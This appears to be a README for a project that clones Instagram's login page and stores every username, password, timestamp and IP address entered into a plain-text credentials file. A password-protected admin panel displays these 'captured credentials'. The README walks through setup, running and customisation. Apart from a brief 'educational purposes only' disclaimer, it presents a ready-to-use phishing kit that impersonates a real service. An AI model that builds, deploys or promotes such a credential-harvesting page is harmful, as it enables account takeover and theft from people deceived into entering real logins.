# Instagram Login Page Clone

A complete Instagram-style login page with backend credential storage and admin panel.

## 🚀 Features

- **Authentic Instagram Design**: Pixel-perfect recreation of Instagram's login page
- **Credential Storage**: Automatically stores entered credentials to `/admin` folder
- **Admin Panel**: Secure dashboard to view captured credentials
- **Responsive Design**: Works on desktop, tablet, and mobile devices
- **Real-time Updates**: Admin panel auto-refreshes every 30 seconds

## 📁 Project Structure

```
Insta_Login_Page/
├── index.html          # Main login page
├── style.css           # Instagram-inspired styling
├── script.js           # Client-side form handling
├── server.js           # Node.js backend server
├── package.json        # Project dependencies
├── admin/
│   ├── index.html      # Admin panel interface
│   ├── admin.css       # Admin panel styling
│   ├── admin.js        # Admin panel functionality
│   └── credentials.json # Stored credentials (auto-created)
└── assets/
    └── instagram-logo.png # Instagram logo (optional)
```

## 🛠️ Setup Instructions

### Prerequisites
- Node.js (v14 or higher)
- npm (comes with Node.js)

### Installation

1. **Navigate to the project directory:**
   ```bash
   cd c:\Users\SHASHI\Desktop\coding\programs\Insta_Login_Page
   ```

2. **Install dependencies:**
   ```bash
   npm install
   ```

3. **Start the server:**
   ```bash
   npm start
   ```
   or
   ```bash
   node server.js
   ```

4. **Access the application:**
   - **Login Page**: http://localhost:3000
   - **Admin Panel**: http://localhost:3000/admin

## 🔐 Admin Access

- **Default Password**: `admin123`
- Change the password in `server.js` (line 48)

## 📊 How It Works

1. **User visits the login page** at `http://localhost:3000`
2. **Enters credentials** (username/email and password)
3. **Submits the form** - credentials are sent to the backend
4. **Server stores credentials** in `admin/credentials.json` with:
   - Username
   - Password
   - Timestamp
   - IP Address
5. **Admin can view** all captured credentials at `http://localhost:3000/admin`

## 🎨 Customization

### Change Admin Password
Edit `server.js` line 48:
```javascript
if (password === 'your-new-password') {
```

### Change Server Port
Edit `server.js` line 6:
```javascript
const PORT = 3000; // Change to your preferred port
```

### Modify Styling
Edit `style.css` to customize colors, fonts, and layout.

## ⚠️ Important Notes

> **Educational Purpose Only**: This project is for educational purposes to understand web security, form handling, and credential storage. Never use this for malicious purposes or without proper authorization.

> **Security Warning**: This implementation uses basic authentication and stores passwords in plain text. In production environments, always use:
> - HTTPS encryption
> - Password hashing (bcrypt, argon2)
> - Proper authentication (JWT, OAuth)
> - Database instead of JSON files
> - CSRF protection
> - Rate limiting

## 📦 Dependencies

- **express**: ^4.18.2 - Web server framework
- **body-parser**: ^1.20.2 - Parse incoming request bodies
- **cors**: ^2.8.5 - Enable Cross-Origin Resource Sharing

## 🧪 Testing

1. Open `http://localhost:3000` in your browser
2. Enter test credentials (e.g., username: "test", password: "test123")
3. Click "Log in"
4. Navigate to `http://localhost:3000/admin`
5. Enter admin password: `admin123`
6. Verify credentials appear in the table

## 📝 License

This project is for educational purposes only.

---

**Created for learning purposes** - Understanding web security, authentication, and credential handling.
